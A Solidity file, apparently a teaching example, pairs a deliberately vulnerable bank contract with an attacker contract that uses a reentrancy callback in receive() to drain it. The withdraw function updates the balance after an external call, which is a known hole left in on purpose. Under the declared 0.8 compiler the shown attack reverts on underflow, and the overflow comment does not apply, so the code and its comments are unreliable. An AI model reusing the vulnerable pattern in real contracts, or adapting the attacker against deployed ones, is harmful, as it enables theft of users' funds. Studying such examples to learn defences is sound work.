pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE: Reentrancy vulnerability
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Vulnerable pattern: state update after external call
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
    }

    // VULNERABLE: Integer overflow/underflow (pre-Solidity 0.8)
    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        balances[to] += amount;  // Potential overflow
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    VulnerableBank public bank;
    bool public isAttacking;

    constructor(address bankAddress) {
        bank = VulnerableBank(bankAddress);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        // Deposit to become a legitimate user
        bank.deposit{value: 1 ether}();

        // Start reentrancy attack
        isAttacking = true;
        bank.withdraw(1 ether);
        isAttacking = false;
    }

    receive() external payable {
        if (isAttacking && address(bank).balance >= 1 ether) {
            // Re-enter the withdraw function
            bank.withdraw(1 ether);
        }
    }
}

